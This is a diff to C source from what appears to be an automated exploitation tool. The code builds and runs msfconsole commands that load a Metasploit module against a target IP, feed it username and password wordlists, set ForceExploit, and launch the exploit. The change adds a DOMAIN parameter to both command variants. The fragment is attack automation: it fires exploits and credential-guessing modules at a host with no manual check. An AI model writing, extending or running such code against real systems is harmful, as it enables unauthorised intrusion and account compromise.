@@ -174,8 +174,10 @@ int any(int type){
 							"set SRVHOST %s;"
 							"set USER_FILE %s;"
 							"set PASS_FILE %s;"
+							"set DOMAIN %s;"
 							"set ForceExploit true;"
-							"exploit;exit'",strSearch,target.strTargetIp, portUnderHacking, networkInfo.interfaceIp, networkInfo.interfaceIp,userFilePath, passFilePath);
+							"exploit;exit'",strSearch,target.strTargetIp, portUnderHacking, networkInfo.interfaceIp, networkInfo.interfaceIp,
+							userFilePath, passFilePath,target.strTargetIp);
 				}else{
 					snprintf(cmd,sizeof(cmd),"msfconsole -q -x 'use %s;"
 							"set RHOSTS %s;"
@@ -183,8 +185,10 @@ int any(int type){
 							"set SRVHOST %s;"
 							"set USER_FILE %s;"
 							"set PASS_FILE %s;"
+							"set DOMAIN %s;"
 							"set ForceExploit true;"
-							"exploit;exit'",strSearch,target.strTargetIp, networkInfo.interfaceIp, networkInfo.interfaceIp,userFilePath,passFilePath);
+							"exploit;exit'",strSearch,target.strTargetIp, networkInfo.interfaceIp, networkInfo.interfaceIp,
+							userFilePath,passFilePath,target.strTargetIp);
 				}
 				system_call(cmd);
 				PRINT_RESET;
